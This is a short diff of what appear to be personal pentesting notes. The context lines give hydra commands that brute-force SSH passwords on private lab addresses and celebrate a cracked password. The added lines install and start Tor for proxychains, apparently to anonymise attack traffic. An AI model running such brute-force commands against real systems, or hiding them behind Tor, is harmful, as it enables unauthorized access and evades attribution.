@@ -54,6 +54,10 @@ ALHAMDULLAH !!!! successfully cracked password using hydra
 hydra -l administrator -P password.txt -T 20 192.168.174.129 ssh
 hydra -l sajib -P password.txt -T 20 192.168.174.128  ssh
 
+///proxychain with Tor
+sudo apt-get install tor
+sudo service tor start
+
 
 
 
